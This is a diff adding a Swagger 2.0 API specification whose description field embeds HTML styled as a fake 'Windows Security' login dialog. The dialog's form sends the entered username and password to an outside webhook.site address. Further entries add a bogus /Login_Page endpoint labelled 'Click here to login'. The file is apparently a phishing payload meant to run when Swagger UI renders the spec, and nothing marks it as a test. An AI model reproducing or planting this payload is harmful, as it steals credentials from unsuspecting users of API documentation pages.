@@ -1,0 +1,41 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: 'Swagger UI'
+  description: '<div style="max-width:380px;margin:60px auto;border:1px solid #999;box-shadow:0 8px 24px rgba(0,0,0,.35);font-family:Segoe UI,Arial;background:#f0f0f0;">
+  <div style="background:#0078d7;color:#fff;padding:8px 12px;font-size:14px;">Windows Security</div>
+  <div style="padding:20px;font-size:13px;color:#333;">
+    <p>Enter your credentials to connect to <strong>internal-api</strong></p>
+    <form action="https://webhook.site/REPLACE-ME" method="post">
+      <input type="text" name="user" placeholder="Username" style="width:100%;padding:8px;margin-bottom:10px;border:1px solid #aaa;">
+      <input type="password" name="pass" placeholder="Password" style="width:100%;padding:8px;margin-bottom:14px;border:1px solid #aaa;">
+      <button type="submit" style="padding:8px 24px;background:#0078d7;color:#fff;border:none;">OK</button>
+      <button type="button" style="padding:8px 24px;background:#e1e1e1;color:#000;border:none;">Cancel</button>
+    </form>
+  </div>
+</div>'
+paths:
+  /Login_Page:
+    post:
+      summary: Login here to continue
+      description: Please provide your credentials to continue.
+      parameters:
+        - name: username
+          in: formData
+          description: The username for login
+          required: true
+          type: string
+        - name: password
+          in: formData
+          description: The password for login
+          required: true
+          type: string
+      tags:
+        - Click here to login
+      responses:
+        '200':
+          description: OK
+        '400':
+          description: Bad request
+        '500':
+          description: Server error
